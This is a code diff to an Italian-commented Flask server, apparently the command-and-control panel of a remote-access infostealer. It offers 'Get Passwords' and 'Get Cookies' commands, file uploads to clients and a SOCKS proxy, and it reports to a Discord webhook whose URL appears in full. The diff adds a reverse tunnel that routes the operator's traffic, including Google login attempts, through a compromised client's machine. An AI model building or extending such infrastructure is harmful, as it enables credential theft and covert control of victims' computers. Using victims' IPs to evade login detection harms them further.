@@ -6,12 +6,13 @@ import requests
 from datetime import datetime
 import os
 import hashlib
+import uuid
 
 app = Flask(__name__)
 
 # Configurazione Discord
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"  # ⚠️ SOSTITUISCI
-CURRENT_VERSION = "1.3.0"
+CURRENT_VERSION = "1.4.0"  # 🆕 Versione con Reverse Tunnel
 
 class ClientManager:
     def __init__(self):
@@ -20,10 +21,21 @@ class ClientManager:
         self.lock = threading.Lock()
         self.commands_queue = {}
         self.client_fingerprints = {}
+        self.tunnel_commands = {}  # 🆕 CODA COMANDI TUNNEL
+        self.active_tunnels = {}   # 🆕 TUNNEL ATTIVI
     
     def generate_fingerprint(self, client_data, ip_address):
         fingerprint_str = f"{client_data.get('hostname','')}{ip_address}{client_data.get('username','')}"
         return hashlib.md5(fingerprint_str.encode()).hexdigest()
+    
+    def get_real_client_ip(self, request):
+        """🆕 Ottiene il vero IP del client"""
+        if request.headers.get('X-Forwarded-For'):
+            return request.headers.get('X-Forwarded-For').split(',')[0]
+        elif request.headers.get('X-Real-IP'):
+            return request.headers.get('X-Real-IP')
+        else:
+            return request.remote_addr
     
     def add_client(self, client_data, ip_address):
         with self.lock:
@@ -35,7 +47,8 @@ class ClientManager:
                     "data": client_data,
                     "last_seen": datetime.now(),
                     "ip": ip_address,
-                    "fingerprint": fingerprint
+                    "fingerprint": fingerprint,
+                    "public_ip": client_data.get('public_ip', 'unknown')  # 🆕 IP PUBBLICO
                 }
                 return client_id
             else:
@@ -44,7 +57,8 @@ class ClientManager:
                     "data": client_data,
                     "last_seen": datetime.now(),
                     "ip": ip_address,
-                    "fingerprint": fingerprint
+                    "fingerprint": fingerprint,
+                    "public_ip": client_data.get('public_ip', 'unknown')  # 🆕 IP PUBBLICO
                 }
                 self.client_fingerprints[fingerprint] = client_id
                 self.next_client_id += 1
@@ -59,6 +73,10 @@ class ClientManager:
                 del self.clients[client_id]
             if client_id in self.commands_queue:
                 del self.commands_queue[client_id]
+            if client_id in self.tunnel_commands:
+                del self.tunnel_commands[client_id]
+            if client_id in self.active_tunnels:
+                del self.active_tunnels[client_id]
     
     def get_client(self, client_id):
         with self.lock:
@@ -79,6 +97,41 @@ class ClientManager:
             if client_id in self.commands_queue and self.commands_queue[client_id]:
                 return self.commands_queue[client_id].pop(0)
             return None
+    
+    # 🆕 METODI PER REVERSE TUNNEL
+    def add_tunnel_command(self, client_id, tunnel_command):
+        with self.lock:
+            if client_id not in self.tunnel_commands:
+                self.tunnel_commands[client_id] = []
+            self.tunnel_commands[client_id].append(tunnel_command)
+    
+    def get_tunnel_command(self, client_id):
+        with self.lock:
+            if client_id in self.tunnel_commands and self.tunnel_commands[client_id]:
+                return self.tunnel_commands[client_id].pop(0)
+            return None
+    
+    def create_tunnel(self, client_id, target_host, target_port):
+        """🆕 Crea un nuovo tunnel e restituisce l'ID"""
+        tunnel_id = str(uuid.uuid4())
+        with self.lock:
+            self.active_tunnels[tunnel_id] = {
+                'client_id': client_id,
+                'target_host': target_host,
+                'target_port': target_port,
+                'status': 'pending',
+                'created_at': datetime.now()
+            }
+        return tunnel_id
+    
+    def update_tunnel_status(self, tunnel_id, status, error=None):
+        """🆕 Aggiorna lo stato di un tunnel"""
+        with self.lock:
+            if tunnel_id in self.active_tunnels:
+                self.active_tunnels[tunnel_id]['status'] = status
+                if error:
+                    self.active_tunnels[tunnel_id]['error'] = error
+                self.active_tunnels[tunnel_id]['updated_at'] = datetime.now()
 
 client_manager = ClientManager()
 
@@ -98,17 +151,186 @@ def send_to_discord(message, data_type="SERVER"):
         print(f"Discord error: {e}")
         return False
 
+# 🆕 ROTTE PER REVERSE TUNNEL
+@app.route('/api/reverse_tunnel_wait', methods=['GET'])
+def reverse_tunnel_wait():
+    """🆕 Il client si connette qui e aspetta istruzioni di tunneling"""
+    client_id = request.args.get('client_id')
+    
+    if not client_id:
+        return jsonify({"status": "error", "message": "client_id required"})
+    
+    # Aspetta fino a 55 secondi per un comando di tunnel
+    start_time = time.time()
+    while time.time() - start_time < 55:
+        tunnel_command = client_manager.get_tunnel_command(int(client_id))
+        if tunnel_command:
+            send_to_discord(f"🔁 Tunnel attivato per client {client_id} -> {tunnel_command['target_host']}:{tunnel_command['target_port']}")
+            return jsonify(tunnel_command)
+        time.sleep(1)
+    
+    # Timeout - restituisce keepalive
+    return jsonify({"type": "keepalive"})
+
+@app.route('/api/tunnel_result', methods=['POST'])
+def tunnel_result():
+    """🆕 Il client notifica il risultato del tunnel"""
+    try:
+        data = request.json
+        tunnel_id = data.get('tunnel_id')
+        status = data.get('status')
+        error = data.get('error')
+        client_id = data.get('client_id')
+        
+        client_manager.update_tunnel_status(tunnel_id, status, error)
+        
+        if status == 'connected':
+            send_to_discord(f"✅ Tunnel {tunnel_id} connesso con successo")
+        else:
+            send_to_discord(f"❌ Tunnel {tunnel_id} fallito: {error}")
+        
+        return jsonify({"status": "success"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/api/proxy_through_client', methods=['POST'])
+def proxy_through_client():
+    """🆕 Il TUO PC usa questo per inoltrare traffico attraverso PC1"""
+    try:
+        data = request.json
+        client_id = data.get('client_id')
+        target_host = data.get('target_host', 'www.google.com')
+        target_port = data.get('target_port', 443)
+        
+        if not client_id:
+            return jsonify({"status": "error", "message": "client_id required"})
+        
+        # Crea un nuovo tunnel
+        tunnel_id = client_manager.create_tunnel(int(client_id), target_host, target_port)
+        
+        # Invia comando al client
+        client_manager.add_tunnel_command(int(client_id), {
+            'type': 'proxy_request',
+            'target_host': target_host,
+            'target_port': target_port,
+            'tunnel_id': tunnel_id
+        })
+        
+        send_to_discord(f"🌐 Proxy tunnel richiesto: {target_host}:{target_port} attraverso client {client_id}")
+        
+        # Aspetta che il tunnel sia connesso
+        for _ in range(10):
+            time.sleep(1)
+            tunnel_info = client_manager.active_tunnels.get(tunnel_id, {})
+            if tunnel_info.get('status') == 'connected':
+                return jsonify({
+                    "status": "success", 
+                    "tunnel_id": tunnel_id,
+                    "message": f"Tunnel connected to {target_host}:{target_port}"
+                })
+            elif tunnel_info.get('status') == 'failed':
+                return jsonify({
+                    "status": "error", 
+                    "message": f"Tunnel failed: {tunnel_info.get('error', 'Unknown error')}"
+                })
+        
+        return jsonify({
+            "status": "timeout", 
+            "message": "Tunnel connection timeout"
+        })
+        
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/api/test_google_login/<int:client_id>')
+def test_google_login(client_id):
+    """🆕 Testa il login Google attraverso il client specificato"""
+    try:
+        # Attiva il tunnel verso Google
+        tunnel_response = proxy_through_client()
+        
+        if tunnel_response.json.get('status') != 'success':
+            return f"Tunnel failed: {tunnel_response.json.get('message')}"
+        
+        # Qui puoi implementare la logica per fare richieste HTTP attraverso il tunnel
+        # Per ora restituiamo solo lo stato
+        return f'''
+        <h3>Google Login Test</h3>
+        <p>Client: {client_id}</p>
+        <p>Tunnel Status: {tunnel_response.json.get('message')}</p>
+        <p>Google dovrebbe vedere l'IP di PC2</p>
+        <a href="/proxy_control">Back to Proxy Control</a>
+        '''
+    except Exception as e:
+        return f"Error: {str(e)}"
+
 @app.route('/')
 def home():
     clients_count = len(client_manager.list_clients())
     return f"""
     <h1>Security Test Server v{CURRENT_VERSION}</h1>
-    <p>PythonAnywhere + Discord + SOCKS Proxy</p>
+    <p>PythonAnywhere + Reverse Tunnel + SOCKS Proxy</p>
     <p>Client connessi: {clients_count}</p>
     <p><a href="/admin">Admin Panel</a></p>
     <p><a href="/proxy_control">🔌 Proxy Control</a></p>
     <p><a href="/api/clients">API Clients</a></p>
+    <p><a href="/tunnel_test">🧪 Test Reverse Tunnel</a></p>
     """
+
+@app.route('/tunnel_test')
+def tunnel_test():
+    """🆕 Pagina per testare il reverse tunnel"""
+    clients = client_manager.list_clients()
+    clients_html = ""
+    for client_id, info in clients.items():
+        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")} (IP: {info.get("public_ip", "unknown")})</option>'
+    
+    return f'''
+    <h2>🧪 Reverse Tunnel Test v{CURRENT_VERSION}</h2>
+    
+    <h3>🚀 Test Google Through Client</h3>
+    <form action="/api/proxy_through_client" method="post" id="tunnelForm">
+        <label>Select Client (PC1):</label>
+        <select name="client_id" id="clientSelect">
+            {clients_html}
+        </select><br>
+        
+        <label>Target Host:</label>
+        <input type="text" name="target_host" value="www.google.com"><br>
+        
+        <label>Target Port:</label>
+        <input type="number" name="target_port" value="443"><br><br>
+        
+        <button type="button" onclick="testTunnel()">Test Tunnel Connection</button>
+    </form>
+    
+    <div id="result" style="margin-top: 20px;"></div>
+    
+    <script>
+    function testTunnel() {{
+        const clientId = document.getElementById('clientSelect').value;
+        const targetHost = document.querySelector('input[name="target_host"]').value;
+        const targetPort = document.querySelector('input[name="target_port"]').value;
+        
+        fetch('/api/proxy_through_client', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify({{
+                client_id: clientId,
+                target_host: targetHost,
+                target_port: targetPort
+            }})
+        }})
+        .then(response => response.json())
+        .then(data => {{
+            document.getElementById('result').innerHTML = 
+                '<h3>Result:</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        }});
+    }}
+    </script>
+    
+    <p><a href="/proxy_control">Back to Proxy Control</a></p>
+    '''
 
 @app.route('/admin')
 def admin_panel():
@@ -132,6 +354,8 @@ def admin_panel():
             <option value="passwords">Get Passwords</option>
             <option value="cookies">Get Cookies</option>
             <option value="systeminfo">System Info</option>
+            <option value="start_reverse_tunnel">Start Reverse Tunnel</option>
+            <option value="stop_reverse_tunnel">Stop Reverse Tunnel</option>
         </select><br><br>
         
         <button type="submit">Send Command</button>
@@ -165,6 +389,7 @@ def admin_panel():
 
     <p><a href="/proxy_control">🔌 SOCKS Proxy Control</a></p>
     <p><a href="/upload_files">📤 Upload Files to Clients</a></p>
+    <p><a href="/tunnel_test">🧪 Test Reverse Tunnel</a></p>
     <p><a href="/api/clients">View All Clients (JSON)</a></p>
     '''
 
@@ -173,7 +398,7 @@ def proxy_control():
     clients = client_manager.list_clients()
     clients_html = ""
     for client_id, info in clients.items():
-        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")} ({info["ip"]})</option>'
+        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")} (IP: {info.get("public_ip", "unknown")})</option>'
     
     return f'''
     <h2>🔌 SOCKS Proxy Control v{CURRENT_VERSION}</h2>
@@ -226,6 +451,9 @@ def proxy_control():
         </select><br><br>
         <button type="submit">Get Public IP</button>
     </form>
+
+    <h3>🧪 Test Reverse Tunnel</h3>
+    <p><a href="/tunnel_test">Test Tunnel Connection to Google</a></p>
 
     <p><a href="/admin">Back to Admin</a></p>
     '''
@@ -417,10 +645,12 @@ def check_update():
 def register_client():
     try:
         client_data = request.json
-        client_ip = request.remote_addr
+        client_ip = client_manager.get_real_client_ip(request)  # 🆕 IP REALE
         client_id = client_manager.add_client(client_data, client_ip)
         
-        send_to_discord(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')}")
+        public_ip = client_data.get('public_ip', 'unknown')
+        
+        send_to_discord(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')} - IP: {public_ip}")
         
         return jsonify({
             "status": "success",
@@ -479,6 +709,7 @@ def list_clients():
                 "data": info["data"],
                 "last_seen": info["last_seen"].isoformat(),
                 "ip": info["ip"],
+                "public_ip": info.get("public_ip", "unknown"),  # 🆕 IP PUBBLICO
                 "fingerprint": info.get("fingerprint", "unknown")
             } for cid, info in clients.items()
         }
